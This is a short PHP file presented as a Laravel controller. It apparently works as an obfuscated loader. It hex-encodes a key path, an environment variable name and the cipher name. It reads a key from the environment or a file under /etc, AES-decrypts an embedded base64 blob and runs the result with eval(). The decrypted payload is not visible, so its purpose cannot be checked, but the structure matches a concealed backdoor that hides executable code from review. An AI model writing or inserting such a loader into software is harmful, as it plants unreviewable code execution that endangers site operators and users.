<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('VRGz/NJrgI2OaHa66nu9RA==');

$c=base64_decode(

'ES2Sg5eVjuGSdvOQ2bPhw4Wr9yKyxXHrZg0162AeUkV6hTubrf+hSaq8IX8u4ZOvphnVlynG8hy6' .
'9zjEyX5ayqXQhPoR0BmWXwfkaLI3SWraHGxz0gdydWwgPFf8jxx0XSN4P0uZtPu0WPTVFRePRFz+' .
'1x5jV06LjnI1g9gR1F6FPUFl42zXPRWa/muWMoVgPToWBB9C09ezzMbYF5B6dz+gAQWum8eRe3JS' .
'C10mg+tcL9jGMy/LTL5o34Ul10c/'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

